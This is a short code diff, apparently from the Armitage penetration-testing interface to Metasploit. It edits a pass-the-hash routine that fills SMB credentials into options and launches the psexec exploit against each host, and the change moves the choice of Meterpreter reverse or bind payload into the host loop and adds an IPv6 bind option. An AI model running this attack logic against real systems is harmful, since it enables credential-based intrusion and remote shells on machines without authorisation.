@@ -189,17 +189,19 @@ sub pass_the_hash {
 		else {
 			%options["SMBUser"] = [$user getText];
 			%options["SMBPass"] = [$pass getText];
-
-			if ([$reverse isSelected]) {
-				%options["LHOST"] = $MY_ADDRESS;
-				%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
-			}	
-			else {
-				%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
-			}
 			%options["LPORT"] = randomPort();
 
 			foreach $host ($hosts) {
+				if ([$reverse isSelected]) {
+					%options["LHOST"] = $MY_ADDRESS;
+					%options["PAYLOAD"] = "windows/meterpreter/reverse_tcp";
+				}
+				else if (isIPv6($host)) {
+					%options["PAYLOAD"] = "windows/meterpreter/bind_ipv6_tcp";
+				}
+				else {
+					%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
+				}
 				%options["RHOST"] = $host;
 				module_execute("exploit", "windows/smb/psexec", copy(%options));
 			}
